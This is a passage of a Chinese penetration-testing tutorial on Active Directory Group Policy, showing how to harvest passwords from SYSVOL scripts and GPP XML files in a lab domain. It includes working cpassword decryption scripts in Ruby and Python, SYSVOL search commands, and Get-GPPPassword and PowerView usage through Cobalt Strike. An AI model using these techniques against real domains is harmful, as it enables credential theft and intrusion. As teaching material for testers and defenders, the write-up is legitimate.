style="font-size:15px;line-height:35px;;"><strong>GPO</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">组策略对象，GPO（Group Policy Object），实际上就是组策略设置的集合。</span></p><p><br  /></p><p><span style="font-size:15px;line-height:35px;;">你可以用GPO来存储不同的组策略信息，然后作用在指定OU或者指定作用范围发挥作用。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">默认安装完AD之后，系统默认会存在两个组策略对象</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>Default Domain Policy</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">唯一ID(GUID):{31B2F340-016D-11D2-945F-00C04FB984F9} (都是相同的)</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">默认域策略</span></p><p><br  /></p><p><span style="font-size:15px;line-height:35px;;">Windows Server 2008 creates a Default Domain Policy GPO for every domain in the forest. This domain is the primary method used to set some security-related policies such as password expiration and account lockout.</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.6754297269969667" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/14_lsGlUwwcX1icG6nicxR434IMLHy4DA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4KNEI0YHMIoxwly2Sy3dSD6oVfllsGlUwwcX1icG6nicxR434IMLHy4DA/640?wx_fmt=png'" data-type="png" data-w="989"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">存放的路径:</span></p><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer"><span class="code-snippet__section">C:\Windows\SYSVOL\sysvol\test1.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;"></span><br  /></p><p><img data-ratio="0.39152371342078707" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/15_SxrRkndGaNpLrawTSDBGykYy4L0Izg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4UvLlK2ibcpyjLMdPQNCxeWBeBSxrRkndGaNpLrawTSDBGykYy4L0Izg/640?wx_fmt=png'" data-type="png" data-w="991"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>Default Domain Controllers Policy</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">唯一ID(GUID):｛6AC1786C-016F-11D2-945F- 00C04FB984F9｝ (都是相同的)</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">默认域控制器策略</span></p><p><br  /></p><p><span style="font-size:15px;line-height:35px;;">管理目标“Domain Controllers”容器，影响“Domain Controllers”容器中的域控制器，域控制器账户单独保存在该容器中。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.6649797570850202" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/16_p3ribmuuYpuZ6hw5b0ue6vjZQibyfw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4sP2WDzmUqmjgudvKHVxxibib8eApp3ribmuuYpuZ6hw5b0ue6vjZQibyfw/640?wx_fmt=png'" data-type="png" data-w="988"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">不难看到这个GPO作用的范围是DC这个OU,相应的执行优先级如下图</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.14803149606299212" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/17_RfvfXZI3KMrL7TJLeM9rBhptn3iaTw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4skHdl5YPyNOmNOGqr6f88mlskRfvfXZI3KMrL7TJLeM9rBhptn3iaTw/640?wx_fmt=png'" data-type="png" data-w="1270"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>GPP</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">我们可以看到GPP里面自定义了很多操作，比如本地用户和组的密码控制、计划任务等</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>在GPP出现之前，很多统一管理的操作只能通过脚本来实现，而GPP方便和简化了这样的管理,GPP你可以将其理解为一个功能点,作用是简单化、规范化组策略的发布和使用</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong><img data-ratio="0.6455108359133127" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/18_1QNeQ9W2ze5BnuQ1bgW9KvrAdR5jmA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4GPqRrcM0jpXTGCg7ggBlgmJp1QNeQ9W2ze5BnuQ1bgW9KvrAdR5jmA/640?wx_fmt=png'" data-type="png" data-w="1292"  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h2><span style="font-size:15px;line-height:35px;;">0x2.3 域组策略的利用</span></h2><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h3><strong><span style="font-size:15px;line-height:35px;;">0x2.3.1 读取脚本中密码</span></strong><span style="font-size:15px;line-height:35px;;"></span></h3><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这里我用一个例子来说明,域组策略是怎么加载脚本作用到域内机器的</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer">strComputer = <span class="code-snippet__string">"."</span></span></code><code><span class="code-snippet_outer">Set objUser = GetObject(<span class="code-snippet__string">"WinNT://"</span> &amp; strComputer &amp; <span class="code-snippet__string">"/Administrator, user"</span>)</span></code><code><span class="code-snippet_outer">objUser.SetPassword <span class="code-snippet__string">"123QWEQWE!@#"</span></span></code><code><span class="code-snippet_outer">objUser.SetInfo</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这里我们保存这个脚本为cpass.vbs,这个脚本的作用那就是修改本地管理员账户的密码为</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">123QWEQWE!@#</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这里我直接在域策略的GPO下面直接用脚本来下发这个脚本</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.47856685860524634" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/19_q5HGZezdFh6mWO6mfPItJwvPcsjBqg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4KmhtD8tWkPQLyrQvmib5213ia4q5HGZezdFh6mWO6mfPItJwvPcsjBqg/640?wx_fmt=png'" data-type="png" data-w="1563"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这里为了演示效果,我们在域用户机器上进行强制更新组策略</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="nginx"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">gpupdate</span> /force</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-backh="144" data-backw="335" data-ratio="0.4298507462686567" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/20_SEh9fib0owQ7VRSLNiaL48g1kqQE7A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4AHRuUtoZAzdnG0cFnw4oT0Av38SEh9fib0owQ7VRSLNiaL48g1kqQE7A/640?wx_fmt=png'" data-type="png" data-w="335" style="width: 100%;height: auto;"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">我们可以在域用户中通过搜索脚本文件比如*.vbs&nbsp;*.bat来找到</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.15402567094515754" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/21_yaVnGlqibMqPhXicDqg3XqbDAOibgw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4QvnsZuXcUd8oLzhjtKgZOj6kkCfyaVnGlqibMqPhXicDqg3XqbDAOibgw/640?wx_fmt=png'" data-type="png" data-w="857"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">搜索SYSVOL的下的脚本命令</span></p><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer">shell <span class="code-snippet__keyword">for</span> /r \\dc/sysvol %i in (*.vbs) <span class="code-snippet__keyword">do</span> @echo %i</span></code><code><span class="code-snippet_outer">shell <span class="code-snippet__keyword">for</span> /r \\dc/sysvol %i in (*.bat) <span class="code-snippet__keyword">do</span> @echo %i</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h3><strong><span style="font-size:15px;line-height:35px;;">0x2.3.2 GPP漏洞的利用</span></strong><span style="font-size:15px;line-height:35px;;"></span></h3><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">GPP漏洞只在2008没打补丁版本上存在，超过2008版本的系统是没办法写入密码的。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这个漏洞的产生原因是 使用了GPP功能，如果输入了用户的密码的话，那么密码就会以AES 256加密的形式存储在SYSVOL文件夹下的以XML后缀结尾的xml文件中，这个密码的加密密钥由微软官方给出可以进行解密，但是如果打补丁或者高版本的话，GPP服务是不能输入密码的了，这个漏洞也就相应不存在了。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.6439169139465876" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/22_kx9YTTvYMv7z4t9JgrdU7naeHQ8UhA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4O3PudL41Be7lQfFHnlxvAovickx9YTTvYMv7z4t9JgrdU7naeHQ8UhA/640?wx_fmt=png'" data-type="png" data-w="674"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.7439446366782007" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/23_IvCQ5hSLPfMb5LQQFcKiak33ib74Zg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4VOoNudjuuz0SIicffS2kM4I2DQiaIvCQ5hSLPfMb5LQQFcKiak33ib74Zg/640?wx_fmt=png'" data-type="png" data-w="867"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">输入密码项是被禁用的</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">下面我们来演示下怎么在CS下获取到GPP泄露的密码:</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这里我们在dc2008新建一个OU组:&nbsp;GPPVuln</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.6439169139465876" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/24_kx9YTTvYMv7z4t9JgrdU7naeHQ8UhA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4O3PudL41Be7lQfFHnlxvAovickx9YTTvYMv7z4t9JgrdU7naeHQ8UhA/640?wx_fmt=png'" data-type="png" data-w="674"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">然后在该OU上,我们新建个使用了GPP的本地用户密码的策略</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.3679354094579008" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/25_3aedYTyNIdD2JecoibicjoPdt75QUw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4577glYsPG0iaarvTYFgeJ9lpPEY3aedYTyNIdD2JecoibicjoPdt75QUw/640?wx_fmt=png'" data-type="png" data-w="867"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">获取到该GPO的ID:{A7797762-FD8F-4B74-803E-BAE362BCC905}</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-backh="81" data-backw="401" data-ratio="0.20199501246882792" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/26_ClvlCDGnxsUXEbricVwcAyiaAGaJBw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4H4Wic35uzPuiceza59yDUiaufoakZClvlCDGnxsUXEbricVwcAyiaAGaJBw/640?wx_fmt=png'" data-type="png" data-w="401" style="width: 100%;height: auto;"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.5754601226993865" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/27_fbrL2cZKntwvnv99qIX6uGBF0XBDGA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4ia09mOy4go2GhdgxuyY3cHvrZfbrL2cZKntwvnv99qIX6uGBF0XBDGA/640?wx_fmt=png'" data-type="png" data-w="815"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">然后我们根据该ID去SYSVOL搜索即可得到该目录下的文件</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer"><span class="code-snippet__section">C:\Windows\SYSVOL\sysvol\test1.local\Policies\{A7797762-FD8F-4B74-803E-BAE362BCC905}\Machine\Preferences\Groups</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.3797909407665505" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/28_iaOCM7X32p12AibPCjFr9cU67icdxA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4icuUbh6BY1E5tKZ4MWJcd7palsvHiaOCM7X32p12AibPCjFr9cU67icdxA/640?wx_fmt=png'" data-type="png" data-w="861"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">可以看到在该Groups目录下的xml文件立马就可以看到我们设置gpptest用户名对应的加密的密码HtReckysr1Y4zM8/Mwe9TN4Fbi2L8JU3/PvW9NffrA0</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这个密码的解密方式有很多种，这里给出最常用的两种：</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">1.RUBY的一个脚本gppdecrypt.rb</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="http"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">require&nbsp;'rubygems'</span></span></code><code><span class="code-snippet_outer">require&nbsp;'openssl'</span></code><code><span class="code-snippet_outer">require&nbsp;'base64'</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">encrypted_data&nbsp;=&nbsp;ARGV</span></code><code><span class="code-snippet_outer">def&nbsp;decrypt(encrypted_data)</span></code><code><span class="code-snippet_outer">padding&nbsp;=&nbsp;"="&nbsp;*&nbsp;(4&nbsp;-&nbsp;(encrypted_data.length&nbsp;%&nbsp;4))</span></code><code><span class="code-snippet_outer">epassword&nbsp;=&nbsp;"#{encrypted_data}#{padding}"</span></code><code><span class="code-snippet_outer">decoded&nbsp;=&nbsp;Base64.decode64(epassword)</span></code><code><span class="code-snippet_outer">key&nbsp;=&nbsp;"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"</span></code><code><span class="code-snippet_outer">aes&nbsp;=&nbsp;OpenSSL::Cipher::Cipher.new("AES-256-CBC")</span></code><code><span class="code-snippet_outer">aes.decrypt</span></code><code><span class="code-snippet_outer">aes.key&nbsp;=&nbsp;key</span></code><code><span class="code-snippet_outer">plaintext&nbsp;=&nbsp;aes.update(decoded)</span></code><code><span class="code-snippet_outer">plaintext&nbsp;&lt;&lt;&nbsp;aes.final</span></code><code><span class="code-snippet_outer">pass&nbsp;=&nbsp;plaintext.unpack('v*').pack('C*')&nbsp;#&nbsp;UNICODE&nbsp;conversion</span></code><code><span class="code-snippet_outer">return&nbsp;pass</span></code><code><span class="code-snippet_outer">end</span></code><code><span class="code-snippet_outer">blah&nbsp;=&nbsp;decrypt(encrypted_data)</span></code><code><span class="code-snippet_outer">puts blah</span></code></pre></section><p><br  /></p><p><span style="font-size:15px;line-height:35px;;">2.Gppprefdecrypt.py</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="python"><code><span class="code-snippet_outer"><span class="code-snippet__comment">#!/usr/bin/python</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">#</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># Gpprefdecrypt - Decrypt the password of local users added via Windows 2008 Group Policy Preferences.</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">#</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># This tool decrypts the cpassword attribute value embedded in the Groups.xml file stored in the domain controller's Sysvol share.</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">#</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">import</span> sys</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">from</span> Crypto.Cipher <span class="code-snippet__keyword">import</span> AES</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">from</span> base64 <span class="code-snippet__keyword">import</span> b64decode</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># Init the key</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2</span></span></code><code><span class="code-snippet_outer">key = <span class="code-snippet__string">"""</span></span></code><code><span class="code-snippet_outer">4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8</span></code><code><span class="code-snippet_outer">f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">"""</span>.replace(<span class="code-snippet__string">" "</span>,<span class="code-snippet__string">""</span>).replace(<span class="code-snippet__string">"\n"</span>,<span class="code-snippet__string">""</span>).decode(<span class="code-snippet__string">'hex'</span>)</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># Add padding to the base64 string and decode it</span></span></code><code><span class="code-snippet_outer">cpassword = <span class="code-snippet__string">"HtReckysr1Y4zM8/Mwe9TN4Fbi2L8JU3/PvW9NffrA0"</span></span></code><code><span class="code-snippet_outer">cpassword += <span class="code-snippet__string">"="</span> * ((<span class="code-snippet__number">4</span> - len(cpassword) % <span class="code-snippet__number">4</span>) % <span class="code-snippet__number">4</span>)</span></code><code><span class="code-snippet_outer">password = b64decode(cpassword)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># Decrypt the password</span></span></code><code><span class="code-snippet_outer">o = AES.new(key, AES.MODE_CBC, <span class="code-snippet__string">"\x00"</span> * <span class="code-snippet__number">16</span>).decrypt(password)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"># Print it</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">print</span> o[:-ord(o[<span class="code-snippet__number">-1</span>])].decode(<span class="code-snippet__string">'utf16'</span>)</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">演示效果如下：</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.5944380069524913" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/29_dAfRQjp80iceXyrVhjMQj0CT5BDprA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4ib4HXmlSF5NB8jk0ibBtxZ5CZaNdAfRQjp80iceXyrVhjMQj0CT5BDprA/640?wx_fmt=png'" data-type="png" data-w="863"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">解密如下</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-backh="64" data-backw="190" data-ratio="0.3368421052631579" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/30_0Ncib9Pyh2OOKf3kOvSBQuHUqTg9vw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4kQbxfINONSmeyQtX5DJIiaxyOib0Ncib9Pyh2OOKf3kOvSBQuHUqTg9vw/640?wx_fmt=png'" data-type="png" data-w="190" style="width: 100%;height: auto;"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">我们也要关注该目录下的其他XML文件</span></p><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">Services</span>\<span class="code-snippet__selector-tag">Services</span><span class="code-snippet__selector-class">.xml</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">ScheduledTasks</span>\<span class="code-snippet__selector-tag">ScheduledTasks</span><span class="code-snippet__selector-class">.xml</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">Printers</span>\<span class="code-snippet__selector-tag">Printers</span><span class="code-snippet__selector-class">.xml</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">Drives</span>\<span class="code-snippet__selector-tag">Drives</span><span class="code-snippet__selector-class">.xml</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">DataSources</span>\<span class="code-snippet__selector-tag">DataSources</span><span class="code-snippet__selector-class">.xml</span></span></code></pre></section><p><br  /></p><p><span style="font-size:15px;line-height:35px;;">这里不仅仅是修改本地用户密码这个GPP存在，比如计划任务等需要写入用户密码xml文件都可能存在这个问题</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>1.命令行下搜索</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="nginx"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">dir</span> /s /a \\DC\SYSVOL\<span class="code-snippet__regexp">*.xml</span></span></code></pre></section><p><br  /></p><p><span style="font-size:15px;line-height:35px;;"><strong>2.Get-GPPPassword.ps1的使用</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">使用powershell-import&nbsp;导入Get-GPPPassword.ps1</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">powershell Get-GPPPassword&nbsp;加载该函数</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这个powershell脚本会自动遍历SYSVOL下的敏感文件,并且将密码解密</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>3.针对性用户查找,这里我们可以使用powerview</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这里我们以de1ctf中的wp中的思路自己走一遍那个流程</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">我们在指定的GPPVuln这个OU中添加个账户</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span><img data-ratio="0.6655462184873949" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/31_XiaxT8VSW9UOJW2XlKgfhe3DLNdsVA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4kia7HwOSiaFlWPYDmCTTgaibWeFLXiaxT8VSW9UOJW2XlKgfhe3DLNdsVA/640?wx_fmt=png'" data-type="png" data-w="595"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">下面我们演示如何在域中根据该用户名称来进行针对性的GPP搜索</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">简单的信息收集:</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>1.查看域内共享</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="cs"><code><span class="code-snippet_outer">powershell&nbsp;<span class="code-snippet__keyword">get</span>-domaincomputer|<span class="code-snippet__keyword">get</span>-netshare</span></code></pre></section><p><br  /></p><p><img data-ratio="0.4133738601823708" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/32_rwzecxwN8LjUnqUzAchtKC8MowKt1A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4ic3MxafvwDFribibl7EwnKL0CdvrwzecxwN8LjUnqUzAchtKC8MowKt1A/640?wx_fmt=png'" data-type="png" data-w="658"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span 